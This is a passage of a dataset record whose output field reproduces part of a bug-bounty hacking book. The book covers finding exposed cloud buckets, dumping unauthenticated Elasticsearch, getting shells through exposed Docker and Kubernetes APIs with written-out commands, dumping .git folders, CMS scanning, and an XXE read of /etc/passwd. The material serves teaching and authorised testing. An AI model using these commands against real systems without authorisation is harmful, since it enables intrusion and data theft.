looking for URLs, api keys, usernames,\npasswords, vulnerabilities, and anything else that could provide value."
  },
  {
    "input": "What are the common methods for identifying and exploiting misconfigured cloud storage buckets and unauthenticated database vulnerabilities in web applications?",
    "summary": "The text discusses various web application vulnerabilities, including misconfigured cloud storage buckets, unauthenticated Elasticsearch databases, exposed Docker APIs, and SSRF and CSRF attacks. It provides techniques for identifying and exploiting these issues, such as using GitHub dorks, brute-forcing bucket names, and testing for unauthenticated access. The text also covers SQL injection, command injection, and cross-site web socket hijacking, explaining how to detect and exploit each vulnerability. Overall, it emphasizes the importance of checking for common misconfigurations and vulnerabilities in cloud services and web applications.",
    "output": "Ghostlulz AKA Alex Thomas\nPage | 141\nConclusion\nGitHub is a great source of information. The vast majority of companies now a\ndays have a GitHub page. If you find this page you can monitor all of their\nemployees for sensitive exposures. You can also use GitHub dorks to do a broad\nsearch across all of GitHub. You should be looking for passwords, tokens, api\nkeys, usernames, hidden URLs, or anything else that provides value. Misconfigured Cloud Storage Buckets\nIntroduction\n10 years ago, cloud services like AWS, gcloud, and azure weren't really a thing. Companies bought physical servers and hosted them in house. Today\ncompanies are moving their infrastructure to the cloud as it is more convenient to\nrent resources from third parties. However, cloud services can be tricky to set up\nproperly if you don’t know what you’re doing thus people mess things up and\nintroduce vulnerabilities into their environment. One of the most popular\nvulnerabilities is finding an exposed cloud storage bucket. These buckets are\nused to store files so depending on what's in the bucket you might have access\nto sensitive information. Ghostlulz AKA Alex Thomas\nPage | 142\nAWS S3 Bucket\nIntroduction\nAmazon Web Services (AWS) is by far the most popular cloud service provider\nout there. The vast majority of cloud instances you come across will be hosted on\nthis provider. S3 Bucket Dorks\nYou have probably heard of S3 buckets as people have been pillaging these for\nseveral years now. There are several techniques used to find these buckets you\ncan use google dorks or you can try to brute force the buckets name. I use both\nof these techniques as they often return very different results. The following\ngoogle dork can be used to find buckets belonging to a company:\nsite:.s3.amazonaws.com \"Starbucks\"\nFigure 77: S3 bucket Google dork\nGhostlulz AKA Alex Thomas\nPage | 143\nThe only downside to this is that you will spend a lot of time shifting through the\nresults. However, you may be able to uncover some very interesting endpoints\nthat you would have otherwise missed. S3 Bucket Brute force\nThere are way too many S3 bucket brute force tools a new one seems to come\nout every day. I typically use this one (its mine) but they all do the same thing in\nthe end:\n● https://github.com/ghostlulzhacks/s3brute\npython amazon-s3-enum.py -w BucketNames.txt -d <Domain Here>\nFigure 78: S3 bucket brute force\nIf you go to the vulnerable endpoint you should be able to list all files in the\nbucket. You should be looking for sensitive files such as backup files, zip files,\nuser data, and any other PII information. The below example only has one file\n“index.html”. Ghostlulz AKA Alex Thomas\nPage | 144\nFigure 79: Vulnerable S3 bucket (directory listing)\nIf you find a vulnerable endpoint make sure to verify that it belongs to the\ncompany as I often find false positives. Conclusion\nYou’re going to run into AWS more than all the other cloud providers combined. S3 buckets have been around for a while and hackers have been hacking them\nfor just as long. Companies are constantly exposing sensitive information in their\nS3 buckets so it's definitely a good idea to check for this misconfiguration. Google Cloud Storage\nGoogle cloud storage like Amazon S3 buckets is a place to store files. Like S3\nbuckets Google cloud storage is also vulnerable to anonymous file listing. The\nfollowing tool can be used to brute force these bucket names. Similar to by AWS\ntool it uses permutations to generate bucket names. Ghostlulz AKA Alex Thomas\nPage | 145\n● https://github.com/RhinoSecurityLabs/GCPBucketBrute\npython3 gcpbucketbrute.py -k <Domain Here> -u\nFigure 80: Google bucket brute force tool\nIn this example the tool didn’t find anything. However, if you discover that your\ntarget uses google cloud heavily your results might be different. Once you find a\nvulnerable endpoint visit it and search for sensitive files similar to the AWS\nprocess. Digital ocean Spaces\nIf you are familiar with S3 buckets Digital ocean spaces are literally the same\nexact technology. I typically use google dorks to find these:\nsite:digitaloceanspaces.com <Domain Here>\nGhostlulz AKA Alex Thomas\nPage | 146\nFigure 81: Google dork to find Digital ocean spaces\nYou can also try the brute force approach as well with this tool:\n● https://github.com/appsecco/spaces-finder\nAzure Blob\nIf your target utilizes Microsoft cloud a lot then they are probably using Azure\nblob storage. Like S3 buckets this is used to store files. You won’t be able to\nbrute force these URLs because you have to know the bucket name as well on\nthe blob name. This makes it very hard to brute force names as you have two\nparts of the URL that are unique. However, using google dorks will still work to\nenumerate possible names. Conclusion\nWith so many companies moving to the cloud you are almost guaranteed to run\ninto some storage buckets. When you do make sure to test for anonymous\ndirectory listing and if this is enabled proceed to search for sensitive files and\ninformation. There are several techniques for enumerating these buckets one is\nGhostlulz AKA Alex Thomas\nPage | 147\ngoogle dorks, the other is brute forcing, and another technique is simply looking\nat the source code of a page. These are quick easy wins and depending on what\nyou find you could get a very nice finding. Elastic Search DB\nIntroduction\nYou have probably heard of the popular relational database called MySQL. Elastic search like MySQL is a database used to hold and query information. However, elastic search is typically used to perform full text searches on very\nlarge datasets. Elasticsearch Basics\nThe definition from google describes elastic search as: “ES is a document-\noriented database designed to store, retrieve, and manage document-oriented or\nsemi-structured data. When you use Elasticsearch, you store data in JSON\ndocument form. Then, you query them for retrieval.”\nUnlike MySQL which stores its information in tables elastic search uses\nsomething called types. Each type can have several rows which are called\ndocuments. Documents are basically a json blob that hold your data as shown in\nthe example below:\n{\"id\":1, \"name\":\"ghostlulz\", \"password\":\"SuperSecureP@ssword\"}\nGhostlulz AKA Alex Thomas\nPage | 148\nIn MySQL we use column names but in Elasticsearch we use field names. The\nfield names in the above json blob would be id, name, and password. In MySQL\nwe would store all of our tables in a database. In Elastic search we store our\ndocuments in something called an index. An index is basically a collection of\ndocuments. Figure 82: Elastic Search index\nUnauthenticated Elasticsearch DB\nElastic search has an http server running on port 9200 that can be used to query\nthe database. The major issue here is that a lot of people expose this port to the\npublic internet without any kind of authentication. This means anyone can query\nthe database and extract information. A quick Shodan search will produce a tun\nof results as shown below:\nGhostlulz AKA Alex Thomas\nPage | 149\nFigure 83: Shodan search for elastic search instances\nOnce you have identified that your target has port 9200 open you can easily\ncheck if it is an Elasticsearch database by hitting the root directory with a GET\nrequest. The response should look something like:\n{\n\"name\" : \"r2XXXX\",\n\"cluster_name\" : \"elasticsearch\",\n\"cluster_uuid\" : \"wIVyutV-XXXXXXXXXX\",\n\"version\" : {\n\"number\" : \"5.6.1\",\n\"build_hash\" : \"667b497\",\n\"build_date\" : \"2017-09-14T19:22:05.189Z\",\n\"build_snapshot\" : false,\n\"lucene_version\" : \"6.6.1\"\n},\n\"tagline\" : \"You Know, for Search\"\n}\nOnce you know an endpoint has an exposed Elastic Search db try to find all the\nindexes (Databases) that are available. This can be done by hitting the\n“/_cat/indices?v” endpoint with a GET request. This will list out all of the\nindexes as shown below:\nGhostlulz AKA Alex Thomas\nPage | 150\nhealth status index uuid pri rep docs.count docs.deleted store.size\npri.store.size\nyellow open bookings lz8yHxqbQuGEDijkdEozAA 5 1 524 0 303.5kb\n\n303.5kb\nyellow open company HMOFvOQDSiapSoI_QAsxzg 5 1 0 0 960b\n960b\nyellow open geosys _J9pwm4vSrWLhbo9pchzMg 5 1 61722 0 32.4mb\n\n32.4mb\nyellow open article J6UaQSS0RIaRrrokZ1V6lg 5 1 809 0 6mb\n6mb\nyellow open service SApBMxLLSEWWJOrQoF07Ug 5 1 591 0 433.5kb\n\n433.5kb\nyellow open job_application DSibZjaoQ-mU1MySC4zKrQ 5 1 2 0 16.7kb\n\n16.7kb\nyellow open payment az5VYu9tQAy41u2PIA-daw 5 1 6 0 142.1kb\n\n142.1kb\nyellow open users 6kHqdkvOSx6dmXXIs_JGNg 5 1 1701 463 4.7mb\n\n4.7mb\nyellow open articles JKsFXGXfRXuUULpzjLuPLg 5 1 3 0 79.6kb\n\n79.6kb\nyellow open invoice bgXAHuOLSJaI-37eiBcRBw 5 1 18 0 272.3kb\n\n272.3kb\nyellow open booking zjbhkI4ZS8egwyuhweNY8g 5 1 545 1 1.7mb\n\n1.7mb\nyellow open address CKteiX6qRUCYWxkBZCe6Bg 5 1 6245 0 2mb\n2mb\nyellow open job_post qrzfzvvKT3uSOXIY3nzW6Q 5 1 36 0 344.6kb\n\n344.6kb\nyellow open user HZBWADUeST-pBY4c0L88Pw 5 1 2134 12 9.1mb\n\n9.1mb\nyellow open job_applications B9dyKfW7TbeJppKu-4zpvA 5 1 1 0 8.2kb\n\n8.2kb\nyellow open services 0cXzhBcoR8ecQMurouw6Qg 5 1 579 0 479kb\n479kb\nyellow open addressables ZM45C_69QXugOFLP-M16LQ 5 1 6245 745 2.4mb\n\n2.4mb\nyellow open job_posts _-nkfsW2TiKHLhTdSRmfuA 5 1 35 0 70.8kb\n\n70.8kb\nyellow open invoices PoNCOfg6QjSi0I7fPhPbBw 5 1 12 0 84.7kb\n\n84.7kb\nyellow open user_services bBwhZ0eDTAeqS5AID8Z-2g 5 1 1384 298 1.7mb\n\n1.7mb\nyellow open user_service _c75afkpQVWjyeWHQUoMDw 5 1 1485 22 1.2mb\n\n1.2mb\nyellow open payments de4kC0k-RfuoypmE19cLRw 5 1 6\nThis information along with other details about the service can also be found by\nquerying the “/_stats/?pretty=1” endpoint. To perform a full text search on the database you can use the following\ncommand “/_all/_search?q=email”. This will query every index for the word\n“email”. There are a few words that I like to search for which include:\nGhostlulz AKA Alex Thomas\nPage | 151\n● Username\n● User\n● Email\n● Password\n● Token\nIf you want to query a specific index you can replace the “_all” with the name of\nthe index you want to search against. Another useful technique is to list all of the field names by making a GET request\nto “/INDEX_NAME_HERE/_mapping?pretty=1” endpoint. I typically search for\nthe same interesting words mentioned above. The output should look something\nlike this:\n{\n\"address\" : {\n\"mappings\" : {\n\"_default_\" : {\n\"properties\" : {\n\"text\" : {\n\"type\" : \"text\",\n\"fields\" : {\n\"raw\" : {\n\"type\" : \"keyword\"\n}\n}\n}\n}\n},\n\"addressables\" : {\n\"properties\" : {\n\"addressable_id\" : {\n\"type\" : \"long\"\n},\n\"addressable_type\" : {\n\"type\" : \"text\",\n\"fields\" : {\n\"keyword\" : {\n\"type\" : \"keyword\",\n\"ignore_above\" : 256\n}\n}\n},\n\"city\" : {\n\"type\" : \"text\",\n\"fields\" : {\n\"keyword\" : {\n\"type\" : \"keyword\",\nGhostlulz AKA Alex Thomas\nPage | 152\n\"ignore_above\" : 256\n}\n}\nWe can see we have the field names addressable_type, city, and much more\nwhich isn’t displayed as the output was too large. To query all values that contain a specific field name use the following command\n“/_all/_search?q=_exists:email&pretty=1” . This will return documents that\ncontain a field name(column) named email as shown below:\n{\n\"took\" : 12,\n\"timed_out\" : false,\n\"_shards\" : {\n\"total\" : 110,\n\"successful\" : 110,\n\"skipped\" : 0,\n\"failed\" : 0\n},\n\"hits\" : {\n\"total\" : 7772,\n\"max_score\" : 1.0,\n\"hits\" : [\n{\n\"_index\" : \"address\",\n\"_type\" : \"addressables\",\n\"_id\" : \"19\",\n\"_score\" : 1.0,\n\"_source\" : {\n\"id\" : 19,\n\"addressable_id\" : 55,\n\"addressable_type\" : \"FHMatch\\\\Models\\\\User\",\n\"lang\" : \"en\",\n\"address1\" : null,\n\"city\" : \"Alpharetta\",\n\"state\" : \"GA\",\n\"postal\" : \"30004\",\n\"country\" : \"US\",\n\"lat\" : \"REDACTED\",\n\"lon\" : \"REDACTED\",\n\"email\" : \"REDACTED@yahoo.com\",\n\"phone\" : \"REDACTED\",\n\"website\" : null,\n\"timezone\" : \"America/New_York\",\n\"currency\" : \"USD\",\n\"privacy\" : null,\n\"meta\" : null,\n\"created_at\" : \"2017-09-26 19:42:02\",\n\"updated_at\" : \"2017-09-26 19:42:02\",\n\"deleted_at\" : null\n}\nGhostlulz AKA Alex Thomas\nPage | 153\n},\nAgain, you can replace “_all” with the name of an index to perform searches\nspecifically against that endpoint. Conclusion\nElastic Search is just another database where you can store and query\ninformation. The major problem is that people expose the unauthenticated web\nservice to the public. With unauthenticated access to the web service attackers\ncan easily dump the entire database. Docker API\nIntroduction\nIn the old days if you developed a piece of code it might work fine on your\ncomputer but when you put it on a different system it completely fails, Docker\nwas designed to fix this problem. Docker is an open source software platform to\ncreate, deploy and manage virtualized application containers on a common\noperating system (OS), with an ecosystem of allied tools. Exposed Docker API\nWhen you install docker on a system it will expose an API on your local host\nlocated on port 2375. This API can be used to interact with the docker engine\nwhich basically gives you the right to do anything you desire unauthenticated. Ghostlulz AKA Alex Thomas\nPage | 154\nUnder these conditions no external party will be able to access your docker API\nas it isn't exposed to the world. However, in certain instances this API can be\nchanged so that it can be accessed by external resources. If done improperly this\nwill expose the docker API to the world as shown by the following Shodan\nsearch:\nFigure 84: Shodan search for docker API\nTo confirm that a desired host is running Docker you can make a GET request to\nthe /version endpoint. This will print out a json blob as shown below:\n{\n\"Platform\": {\n\"Name\": \"Docker Engine - Community\"\n},\n\"Components\": [\n{\n\"Name\": \"Engine\",\n\"Version\": \"18.09.0\",\n\"Details\": {\n\"ApiVersion\": \"1.39\",\n\"Arch\": \"amd64\",\n\"BuildTime\": \"2018-11-07T00:56:41.000000000+00:00\",\n\"Experimental\": \"false\",\n\"GitCommit\": \"4d60db4\",\n\"GoVersion\": \"go1.10.4\",\n\"KernelVersion\": \"10.0 14393 (14393.3204.amd64fre.rs1_release.190830-1500)\",\n\"MinAPIVersion\": \"1.24\",\n\"Os\": \"windows\"\n}\nGhostlulz AKA Alex Thomas\nPage | 155\n}\n],\n\"Version\": \"18.09.0\",\n\"ApiVersion\": \"1.39\",\n\"MinAPIVersion\": \"1.24\",\n\"GitCommit\": \"4d60db4\",\n\"GoVersion\": \"go1.10.4\",\n\"Os\": \"windows\",\n\"Arch\": \"amd64\",\n\"KernelVersion\": \"10.0 14393 (14393.3204.amd64fre.rs1_release.190830-1500)\",\n\"BuildTime\": \"2018-11-07T00:56:41.000000000+00:00\"\n}\nOnce you have confirmed that a docker API is exposed I will generally move to\nthe CLI version of docker. From the CLI you can execute the following command\nto get a list of containers that are currently being ran:\ndocker -H <host>:<port> ps\nFigure 85: Docker list containers in remote host\nAs you can see in the above image, we have a single container running on port\n80 with the name of elegant_easley. We can easily pop a shell on this container\nby running the following command:\nDocker -H <host>:<port> exec -it <container name> /bin/bash\nFigure 86: Docker execute shell command\nGhostlulz AKA Alex Thomas\nPage | 156\nAs you can see in the above image, we were dumped right into a root shell. From\nthere we can do all kinds of things, depending on the docker version you may be\nable to use an exploit to break out of the container into the host machine. You\naren't just limited to popping a shell on their docker container, you can do other\nthings such as deploying your own docker containers. This technique was widely\nused by crypto currency miners which deployed containers on other people’s\ninfrastructure. Conclusion\nThe vast majority of software engineers use docker containers to deploy their\ncode. In the process they might expose their docker API to the public which can\nmean big trouble. Attackers can easily hijack their infrastructure to deploy their\nown containers or even worse they can gain root access to your container. Kubernetes API\nIntroduction\nWith the rise of docker new technologies are bound to be designed around the\nconcept of containers. Kubernetes is an open-source container-orchestration\nsystem for automating application deployment, scaling, and management. It was\noriginally designed by Google. Ghostlulz AKA Alex Thomas\nPage | 157\nExposed Kubernetes API\nKubernetes exposes an unauthenticated REST API on port 10250. If developers\naren’t careful this API can be exposed to the internet. A quick Shodan search will\nfind a bunch of these services. Figure 87: Shodan search for Kubernetes API\nOnce a Kubernetes service is detected the first thing to do is to get a list of pods\nby sending a GET request to the /pods endpoint. The server should respond with\nsomething like:\n{\n“kind”: “PodList”,\n“apiVersion”: “v1”,\n“metadata”: {},\n“items”: [\n{\n“metadata”: {\n“name”: “pushgateway-5fc955dd8d-674qn”,\n“generateName”: “pushgateway-5fc955dd8d-“,\n“namespace”: “monitoring”,\n“selfLink”: “/api/v1/namespaces/monitoring/pods/pushgateway-5fc955dd8d-674qn”,\n“uid”: “d554e035-b759-11e9-814c-525400bdacd2”,\n“resourceVersion”: “9594”,\nGhostlulz AKA Alex Thomas\nPage | 158\n“creationTimestamp”: “2019-08-05T08:20:07Z”,\n“labels”: {\n“app”: “pushgateway”,\n“pod-template-hash”: “1975118848”,\n“prophet.4paradigm.com/deployment”: “pushgateway”\n},\n“annotations”: {\n“kubernetes.io/config.seen”: “2019-08-05T16:20:07.080938229+08:00”,\n“kubernetes.io/config.source”: “api”,\n“kubernetes.io/created-by”:\n“{\\”kind\\”:\\”SerializedReference\\”,\\”apiVersion\\”:\\”v1\\”,\\”reference\\”:{\\”kind\\”:\\”ReplicaSet\\”,\\”name\nspace\\”:\\”monitoring\\”,\\”name\\”:\\”pushgateway-5fc955dd8d\\”,\\”uid\\”:\\”d552bfb3-b759-11e9-814c-\n525400bdacd2\\”,\\”apiVersion\\”:\\”extensions\\”,\\”resourceVersion\\”:\\”9591\\”}}\\n”\n},\n“ownerReferences”: [\n{\n“apiVersion”: “extensions/v1beta1”,\n“kind”: “ReplicaSet”,\n“name”: “pushgateway-5fc955dd8d”,\n“uid”: “d552bfb3-b759-11e9-814c-525400bdacd2”,\n“controller”: true,\n“blockOwnerDeletion”: true\n}\n]\n},\n“spec”: {\n“volumes”: [\n{\n“name”: “default-token-qgm5l”,\n“secret”: {\n“secretName”: “default-token-qgm5l”,\n“defaultMode”: 420\n}\n}\n],\n“containers”: [\n{\n“name”: “pushgateway”,\n“image”: “10.10.0.15:35000/prom/pushgateway:v0.4.1”,\n“ports”: [\n{\n“name”: “http”,\n“containerPort”: 9091,\n“protocol”: “TCP”\n}\n]\nFrom the above response we get namespace name, pod names, and container\nnames:\n● Namespace\n○ monitoring\n● Pod Name\nGhostlulz AKA Alex Thomas\nPage | 159\n○ pushgateway-5fc955dd8d-674qn\n● Container Name\n○ Pushgateway\nWith this information it is possible to send a request to the API service that will\nexecute a provided command.\n\nThis can be done by sending the following GET\nrequest:\ncurl –insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-\nStream-Protocol-Version: channel.k8s.io” -H “Connection: upgrade” -H\n“Upgrade: SPDY/3.1” -X POST\n“https://<DOMAIN>:<PORT>/exec/<NAMESPACE>/<POD\nNAME>/<CONTAINER NAME>?command=<COMMAND TO\nEXECUTE>&input=1&output=1&tty=1”\nAfter sending the requests you should receive a response similar to the message\nbelow:\nFigure 88: Initiate WebSocket connection to Kubernetes API\nGhostlulz AKA Alex Thomas\nPage | 160\nAs you can see the above response indicates it was successful and a web socket\nconnect was created. Note the Location Header value, in this response its value\nis equal to /cri/exec/Bwak7x7h. To handle web socket connections, use the tool wscat. This tool can be\ndownloaded by issuing the following command:\napt-get install node-ws\nNow take the location header value which was noted earlier and send the\nfollowing requests to get the command output:\nwscat -c “https://<DOMAIN>:<PORT>/<Location Header Value>” –no-check\nFigure 89: Kubernetes remote shell\nAs you can see in the above image the command “id” was ran on the container\nand the output is displayed. We have successfully executed code on the remote\ncontainer, RCE is easy. Conclusion\nWith new technology comes new vulnerabilities. The rise of docker containers\ngave birth to Kubernetes. If a developer isn’t careful, they could easily end up\nGhostlulz AKA Alex Thomas\nPage | 161\nexposing the Kubernetes API to the world. This could allow remote attackers to\nexecute commands on containers unauthenticated. .git / .svn\nIntroduction\nSource code repositories like GitHub are extremely popular. A lot of people will\nsimple copy down a git directory and throw it on their website without realizing\nthey might have just exposed their sites source code to the world. Git and\nSubversion are two of the most popular revision control systems and they contain\na hidden file that can cause a lot of harm if uploaded to your website. Git\nGit is a revision control system and it contains a hidden folder “.git” . This folder\nbasically acts as a snapshot for your project. Every-time you create a file git will\ncompresses it and stores it into its own data structure. The compressed object\nwill have a unique name, hash, and will be stored under the object directory. This\nmeans that you can fully recreate the source code and everything else in the\nrepository. If you navigate to “https://example.com/.git” and you see the\nfollowing then that endpoint is vulnerable:\nGhostlulz AKA Alex Thomas\nPage | 162\nFigure 90: Endpoint with .git file exposed\nYou can then recreate the repository which will contain the websites source\ncode. To recreate the repository, you can use the following tool:\n● https://github.com/internetwache/GitTools/tree/master/Dumper\nTo use the tool type “./gitdumper.sh https://example.com/.git/ /output-\ndirectory/”. This will clone the entire repository as shown below:\nGhostlulz AKA Alex Thomas\nPage | 163\nFigure 91: Gitdumper extract .git source code and files\nNext you manually review the source code and look for bugs, vulnerabilities, and\nexposed passwords. You should treat it as a source code review. Subversion\nSubversion like Git is a revision control system and it contains a hidden folder\n“.svn” . This folder can also be used to recreate the source code used on the\nsite. Simply navigate to “https://example.com/.svn”, if you see the following\nthen the endpoint is vulnerable:\nGhostlulz AKA Alex Thomas\nPage | 164\nFigure 92: Exposed .svn file\nThe following tool can be used to extract the files from the folder:\n● https://github.com/anantshri/svn-extractor\nThis tool will allow you to fully recreate the folder structure, source code, and\nother files as shown below:\nFigure 93: Extract source code from vulnerable endpoint\nLike Git once everything is download you will manually review the source code\nand look for bugs, vulnerabilities, and exposed passwords. Basically, treat it as a\nsource code review. Ghostlulz AKA Alex Thomas\nPage | 165\nConclusion\nThe vast majority of software engineers use a revision control system. These\nsystems contain hidden folders that hackers can use to fully recreate the source\ncode used by the site. Once the source code is download hackers can perform a\nsource code review looking for vulnerabilities, hard coded passwords, and much\nmore. You should be searching for “.git” and “.svn” folders during your hunt you\nmight find an easy win. Summary\nThis section was all about finding quick easy wins when searching for\nvulnerabilities. You want to make sure you have a strong grasp on subdomain\ntakeovers, GitHub dorks, and cloud storage misconfigurations. Mastering these\nthree techniques alone will significantly increase the amount of vulnerabilities you\nfind. Ghostlulz AKA Alex Thomas\nPage | 166\nChapter 10: Exploitation CMS\nIntroduction\nA content management system (CMS) is a software application that can be used\nto manage the creation and modification of digital content. CMSs are typically\nused for enterprise content management and web content management. Figure 94: Internet CMS usage stats\nOver half of the websites on the internet are built with a CMS so you're definitely\ngoing to be running into these technologies. WordPress\nAs of right now over a quarter (25%) of the internet is built using WordPress. This\nis useful to know because that means a single exploit has the potential to impact\nGhostlulz AKA Alex Thomas\nPage | 167\na large portion of your target’s assets. There are in fact hundreds of exploits and\nmisconfigurations impacting WordPress and its associated plugins. One common\ntool to scan for these vulnerabilities is wpscan:\n● https://github.com/wpscanteam/wpscan\nThe only thing that’s annoying about this tool is that its written in ruby, I prefer\ntools written in python or Golang. During the fingerprinting phase you should've discovered the technologies\nrunning on your targets assets so it should be easy to search for sites running\nWordPress. Once you find a site scan it with wpscan as shown below:\nwpscan --URL <URL>\nFigure 95: WPScan vulnerability scan\nThe vast majority of the sites you scan are going to be patched. This is because\nmost of these WordPress sites are managed by third party vendors who perform\nautomatic updates. However, you will run into vulnerable plugins quite frequently\nGhostlulz AKA Alex Thomas\nPage | 168\nbut many of these exploits require credentials to exploit. Another thing I find all\nthe time is directly listing on the uploads folder. Always make sure to check “/wp-\ncontent/uploads/” . Figure 96: WordPress site with directory listing on uploads directory\nYou can often find sensitive information such as user emails, passwords, paid\ndigital products, and much more. Joomla\nWordPress is by far the most popular CMS with over 60% of the market share. Joomla comes in second so you can expect to run into this CMS as well. Unlike\nWordPress sites who seem to be fairly locked down Joomla is a mess. If you\nwant to scan for vulnerabilities the most popular tool is Joomscan:\n● https://github.com/rezasp/joomscan\nperl joomscan.pl -u <URL Here>\nGhostlulz AKA Alex Thomas\nPage | 169\nFigure 97: Joomscan vulnerability scanner\nDrupal\nDrupal is the third most popular CMS yet I seem to run into Drupal sites more\nthan Joomla. If you find a Drupal site you want to use droopescan to scan it. This\nscanner also has the ability to scan additional CMSs as well. ● https://github.com/droope/droopescan\npython3 droopescan scan Drupal -u <URL Here> -t 32\nFigure 98: Droopescan vulnerability scanner\nGhostlulz AKA Alex Thomas\nPage | 170\nAdobe AEM\nIf you ever run into the Adobe AEM CMS your about to find a whole bunch of\nvulnerabilities. This CMS is riddled with public vulnerabilities and I’m 100%\npositive there are hundreds more zero days. Seriously this is one of the worst\nCMSs I have ever seen. If you want to scan an application for vulnerabilities use\nthe tool aemhacker:\n● https://github.com/0ang3el/aem-hacker\npython aem_hacker.py -u <URL Here> --host <Your Public IP>\nFigure 99: Aem hacker vulnerability scan\nNote that in order to test for the SSRF vulnerabilities you need to have a public\nIP that the target server can connect back to. Other\nThere are hundreds of different CMSs so it wouldn't be practical for me to\nmention every single one of them. The vast majority of sites are going to be\nrunning WordPress, Joomla, and Drupal but you still might run into other CMSs. Ghostlulz AKA Alex Thomas\nPage | 171\nFigure 100: Wappalyzer list of CMS frameworks\nIf you come across a CMS you haven't seen before the first step is to go to\nexploit db and see if it has any known CVEs:\n● https://www.exploit-db.com/\nFor instance, if I discover a CMS named “Magento” I would perform the following\nsearch on exploit-db:\nFigure 101: Exploit-db Magento search\nGhostlulz AKA Alex Thomas\nPage | 172\nDon’t stop there you should also look on google to see if any new exploits came\nout that are not on exploit db yet. Figure 102: Search google for known Magento exploits\nAs you can see there is an unauthenticated SQLi exploit that doesn't seem to be\nin the exploit-db database, this is probably because it’s still fairly new. In addition\nto finding single exploits you want to search GitHub to see if there is a tool that\ncan scan for all the possible vulnerabilities and misconfigurations. Figure 103: Search Google for Magento vulnerability scanner\nGhostlulz AKA Alex Thomas\nPage | 173\nAs it turns out there is a Magento vulnerability scanner called magescan so we\ncan just use that:\n● https://github.com/steverobbins/magescan\nMake sure to use this process whenever you come across a CMS framework you\ndon’t recognize. Summary\nOver half of the internet is being ran by a CMS framework. So, you are almost\nguaranteed to run into a CMS at one point or another. When you do find a CMS,\nyou don’t want to waste time manually testing the endpoint, you want to test for\nknown CVEs and misconfigurations. The best way to do this is to find some sort\nof CMS specific vulnerability scanner. If you can find that you can try searching\nexploit-db and google for known CVEs. If you still come up empty handed it’s\nprobably best to move on unless your hunting for zero days. Ghostlulz AKA Alex Thomas\nPage | 174\nChapter 11: Exploitation OWASP\nIntroduction\nIf you come across a custom-built application you won’t be able to search for\nknown CVEs you will have to find these vulnerabilities by hand. This will require\nyou to know the OWASP top 10 vulnerabilities and a bunch more not listed there. You need to become proficient at testing common vulnerabilities such as XSS\nSQLI, LFI, RFI, CSRF, XXE, and SSRF. The only tool you need is Burp Suite:\n● https://portswigger.net/burp\nHowever, some testers like to use automated scanners such as SQL injection\nscanners, XSS scanners, Burp scanner, and others. I normally use a mix of\nautomated scanners and manual testing as they both have their advantages and\ndrawbacks. XML External Entity (XXE)\nIntroduction\nXML External Entity (XXE) is a vulnerability that can appear when an application\nparses XML. Before diving into what XXE is you need to have a solid\nunderstanding of XML first. Ghostlulz AKA Alex Thomas\nPage | 175\nXML Basics\nExtensible Markup Language (XML) is a language designed to store and\ntransport data similar to JSON. A sample of what XML looks like can be found\nbelow:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<bookstore>\n<book category=\"cooking\">\n<title lang=\"en\">Everyday Italian</title>\n<author>Giada De Laurentiis</author>\n<year>2005</year>\n<price>30.00</price>\n</book>\n<book category=\"children\">\n<title lang=\"en\">Harry Potter</title>\n<author>J K. Rowling</author>\n<year>2005</year>\n<price>29.99</price>\n</book>\n</bookstore>\nOn the first line you can see the prolog which contains the XML version and\nencoding. Pro tip if you ever see this in burp you should immediately test for\n\nXXE:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\nUnder that you see the “<bookstore>” tag which represents the root node. There\nare two child nodes called “<book>” and each of these contain sub child nodes\ncalled “<title>,<author>,<year>,<price>”.\n<root>\n<child>\n<subchild>.....</subchild>\n</child>\n</root>\nThat’s the basic structure of XML but there is a little more you should know.\nThere is something called document type definition (DTD) which defines the\nGhostlulz AKA Alex Thomas\nPage | 176\nstructure and the legal elements and attributes of an XML document as shown\nbelow:\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [\n<!ENTITY user \"Ghostlulz\">\n<!ENTITY message \"got em\">\n]>\n<test><name>&user;</name></test>\nAs shown above there is something called an ENTITY. This acts a variable. In\nthis example the entity “user” holds the text “Ghostlulz”. This entity can be called\nby typing “&user;” and it will be replaced by the text “Ghostlulz”.\nYou can also use something called an external entity which will load its data from\nan external source. This can be used to get contents from a URL or a file on disk\nas shown below:\n1. <!DOCTYPE foo [ <!ENTITY ext SYSTEM \"http://example.com\" > ]>\n2. <!DOCTYPE foo [ <!ENTITY ext SYSTEM \"file:///path/to/file\" > ]>\nXXE\nI mentioned that you can use external entities to grab data from a file on disk and\nstore it in a variable. What if we tried to read data from the “/etc/passwd” file and\nstore it in a variable? Note that in order to read the data the entity must be\nreturned in the response. Knowing that lets try to exploit our test environment.\nWhile in burp I captured the following POST request which seems to be using\nXML to send data to the back-end system. Whenever you see XML you should\ntest for XXE.\nGhostlulz AKA Alex Thomas\nPage | 177\nFigure 104: POST requests with XML\nTo test for XXE simply put in your malicious external entity and replace each\nnode value with it as shown below:\nFigure 105: XXE payload\nAs shown above I created an external entity to grab the data in the “/etc/passwd”\nfile and stored it in the entity XXE. I then placed the variable in the “<productID>”\nnode. If the server doesn’t block external entities the response will be reflected\nyou. You will then be able to retrieve the contents of the “/etc/passwd” file as\nshown below:\nGhostlulz AKA Alex Thomas\nPage | 178\nFigure 106: Use XXE to read /etc/passwd file\nConclusion\nMost application transmit data using JSON but you may run into applications\nusing XML. When you do make sure to always test for XXE. Abusing this\nvulnerability allows you to read arbitrary files which can lead to fully\ncompromising a machine. The vulnerable application I used can be found at the\nweb security academy put on by Port swigger, its free and their labs are neat:\n• https://portswigger.net/web-security\nGhostlulz AKA Alex Thomas\nPage | 179\nCross Site Scripting (XSS)\nIntroduction\nCross site scripting (XSS) is one of the most popular vulnerabilities in today’s\nweb applications. This vulnerability has been on the OWASP top 10 for several\nyears and doesn’t seem to be going away. This vulnerability can be used to\nexecute malicious JavaScript in a user’s web browser. This could then be used to\nsteal users JWT tokens, CSRF tokens, and cookies. There are three types of\nXSS reflected, stored, and DOM based. The following sections will discuss each\nof these.\nReflected XSS\nSuppose you have an application which produces an error message when you\ntype in the wrong user name and password. The error message could look\nsomething like this:\n“The email or password you entered is not valid. Please try again.”\nYou then notice that there is a GET parameter in the URL which has this same\nmessage:\n“example.com/login.php?error=The+email+or+password+you+entered+is+not\nvalid.+Please+try+again.”\nGhostlulz AKA Alex Thomas\nPage | 180\nFigure 107: Possible XSS\nAs you can see the GET parameter “error” is being reflected in the user web\nbrowser. If the application doesn’t 